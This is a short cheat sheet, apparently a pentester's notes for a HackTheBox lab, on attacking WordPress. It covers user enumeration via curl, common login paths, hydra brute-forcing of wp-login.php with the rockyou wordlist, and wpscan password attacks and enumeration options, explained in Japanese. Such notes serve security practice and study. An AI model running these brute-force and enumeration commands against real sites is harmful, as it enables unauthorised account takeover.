## ## WordPress Enumaration
- Users
```sh
curl -s -I -X GET http://blog.example.com/?author=1
curl http://blog.example.com/wp-json/wp/v2/users
```

- login page directory
	/wp-admin/login.php
	/wp-admin/wp-login.php
	/login.php
	/wp-login.php

- /login page Passsword Attack
```sh
hydra -l <username> -P <password list> <Target hostname> <service module> <post request parameters>

hydra -l admin -P /usr/share/wordlists/rockyou.txt metapress.htb http-post-form "/wp-login.php:log=admin&pwd=admin:Error: The password you entered for the username admin is incorrect. Lost your password?" -vV -f
```
---
## ## wpscan
### ### password attack
```
wpscan --url http://metapress.htb/ -P /usr/share/wordlists/xato-net-10-million-passwords-10000.txt --username admin
```

### ### wpscan enumeration
```
wpscan --url http://metapress.htb/ --enumerate
	指定がない場合は:「vp,vt,tt,cb,dbe,u,m」が適用される。
	その他のオプション
		vp (Vulnerable plugins) 脆弱なプラグイン
		ap (All plugins)　全てのプラグイン
		p (Popular plugins)　人気のプラグイン
		vt (Vulnerable themes)　脆弱なテーマ
		at (All themes)　全てのテーマ
		t (Popular themes)　人気のテーマ
		tt (Timthumbs) Timthumbファイル
		cb (Config backups)　wp-configのバックアップ
		dbe (Db exports)　DBバックアップ
		u (User IDs range. e.g: u1-5)　ユーザー名　u1-5とするとIDのレンジ
		m (Media IDs range. e.g m1-15)　メディア　m1-5とするとIDのレンジ
```
